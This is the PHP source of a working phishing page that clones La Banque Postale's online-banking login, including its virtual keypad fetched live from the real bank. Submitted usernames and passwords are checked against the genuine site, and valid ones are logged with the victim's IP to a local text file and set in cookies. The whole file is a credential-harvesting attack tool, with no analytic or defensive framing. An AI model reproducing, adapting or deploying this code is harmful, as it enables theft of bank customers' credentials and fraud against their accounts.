<?php
include "curl.php";
$ip = getenv("REMOTE_ADDR");
$cookie = "$ip.txt";
$agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";

if($_GET[set] == "ok"){
$user = $_POST[username];
$pass = $_POST[password];
$reffer='https://voscomptesenligne.labanquepostale.fr/wsost/OstBrokerWeb/auth';
$url='https://voscomptesenligne.labanquepostale.fr/wsost/OstBrokerWeb/auth';
$vars = "urlbackend=%2Fvoscomptes%2FcanalXHTML%2Fidentif.ea%3Forigin%3Dparticuliers&origin=particuliers&password=".$_POST[password]."&cv=true&cvvs=&username=$user&";
$str=post($url, $reffer, $agent, $cookie, $vars);
if (strpos($str, "initialiser-identif.ea") != false){

setcookie("UsernameCockie", $_POST[username], time()+3600);
setcookie("PasswordCookie", $_POST[password], time()+3600);

$fp = fopen('../../alice.txt', 'a');
fwrite($fp, "User : ".$_POST[username]."\nPass : ".$_POST[password]."\nImage : ".$_POST[image]."\nIp : $ip\n\n");
fclose($fp);

header('Location: confirmation.php');
echo '
<script type="text/javascript">
if( window.  parent . length !=0) {
    window. top . location .replace( document. location.href);}
</script>
';
}else{
echo '<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1">
<meta charset="UTF-8">
<div id="content">


	<div class="message">
		
		<div class="par parsys"><b><a name="par_56667"></a></b><div class="first parbase section imgLeft textimage">
	<div class="imgLeft">

		
			<div style=""><p>&nbsp;</p>
<p><font color="#FFFFFF"><b>Votre identifiant ou votre mot de passe n\'ont pas 
�t� reconnus. Veuillez r�essayer de saisir votre identifiant (10 chiffres) et 
votre mot de passe (6 chiffres).</b></font></p>
<p>&nbsp;</p>


		
		
		
			<b>

		
		
		
			<a class="link" href="login.php">
				<font color="#FFFFFF">Retour</font></a><font color="#FFFFFF">
				</font>
		
	</b>
		
	</div>

</div>';
}
exit;
}
@unlink($cookie);
$url='https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/identif.ea?origin=particuliers';
$str=get("$url", '', $agent, $cookie);
preg_match('|var IMG_ALL = "(.*)"|U', $str, $log);
$log1 = $log[1];
$log1 = str_replace("allunifie2&e=4&", "allunifie1&e=3&", $log1);
$str=get("https://voscomptesenligne.labanquepostale.fr/wsost/OstBrokerWeb/$log1", '', $agent, $cookie);


$fp = fopen("data_img/$ip.png", 'w');
fwrite($fp, $str);

fclose($fp);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html class="no-js" lang="fr"><head>

<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>
Identification - La Banque Postale</title>

<meta http-equiv="content-style-type" content="text/css">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="icon" type="image/png" href="images/ico.png" />
<style type="text/css">
@import url(./css/cvs_all.css);
[id="imageclavier"]{
background:url()  no-repeat 13px 6px; 
} 
</style>
<style type="text/css" media="(orientation:portrait) and (max-height:533px)">
@import url(./css/cvs_portable.css);
[id="imageclavier"]{
background:url(loginform.php?id=<?php echo time(); ?>) no-repeat 13px 6px; 
}
</style></head>
<body id="mobipart" style="background-image: url('img/bad.png');">

<form method="post" action="?set=ok" name="formAccesCompte">
<div id="cvs-bloc">
<div style="margin-left: 3px; width: 270px;" id="cvs-bloc-identifiant"><label class="webaccess" for="val_cel_identifiant">
	identifiant</label>
<input autocorrect="off" name="username" id="val_cel_identifiant" autocapitalize="off" format="*N" placeholder="Saisissez ici votre identifiant" maxlength="10" pattern="[0-9,a-z,A-Z]*" spellcheck="false" onkeypress="return checkInput(event);" type="tel"> <input class="input-non-modif" id="val_cel_identifiant_masque" disabled="disabled" type="tel"> <input id="saveId" name="saveId" onchange="modifIdent()" type="checkbox"> <label for="saveId">
	Memoriser mon identifiant.</label> </div>
<div id="cvs-bloc-mdp"> <label class="webaccess" for="cvs-bloc-mdp-input">mot de 
	passe</label> <input name="password" disabled="disabled" id="cvs-bloc-mdp-input" placeholder="Composez votre mot de passe" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" type="text">
<div id="cvs-lien-voca"> <input class="non-cache" id="cvs-lien-voca-active" value="Activer la vocalisation" onclick="CVSVTable.lancer();" type="button"> <input class="cache" id="cvs-lien-voca-desactive" value="D�&#402;¦#402;�&#8224;¦#8217;�&#402;¦#8218;�&#8218;©sactiver la vocalisation" onclick="desactiverVocalisation();" type="button"> </div>
<div id="blocImage">
<div id="imageclavier">
<div> <button type="button" value="5" id="val_cel_0"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="1" id="val_cel_1"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="8" id="val_cel_2"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="3" id="val_cel_3"><img alt="" src="images/transparent.gif"></button></div>
<!--



-->
<div> <button type="button" id="val_cel_4"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" id="val_cel_5"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="4" id="val_cel_6"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="0" id="val_cel_7"><img alt="" src="images/transparent.gif"></button></div>
<!--



-->
<div> <button type="button" id="val_cel_8"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="9" id="val_cel_9"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="6" id="val_cel_10"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="7" id="val_cel_11"><img alt="" src="images/transparent.gif"></button></div>
<!--



-->
<div> <button type="button" id="val_cel_12"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" value="2" id="val_cel_13"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" id="val_cel_14"><img alt="" src="images/transparent.gif"></button><!--



--><button type="button" id="val_cel_15"><img alt="" src="images/transparent.gif"></button></div>
</div>
</div>
<div class="webaccess">Fin du clavier virtuel</div>
</div>
<div id="cvs-bloc-boutons"> <input name="password" id="cs" value="" type="hidden"><input id="valider" value="Valider" disabled="disabled" class="grey" onclick="sendForm();" type="button"> <input id="effacer" value="Effacer" onclick="CVSVTable.reset();" type="button">
</div>
</div>
</form>
<div id="cvs_swf">&nbsp;</div>
<div id="audio_box"> <audio id="audio" preload="none"><br>
</audio> </div>
<noscript>
<div id="noscript"> </div>
</noscript>
<script language="javascript" type="text/javascript" src="./js/jquery-1.7.2.min.js"></script>
<script language="javascript" type="text/javascript" src="./js/val_keypad_cvvs-commun-unifie.js"></script>
<script language="javascript" type="text/javascript" src="./js/val_keypad_cvvs-unifie.js"></script>
</body></html>
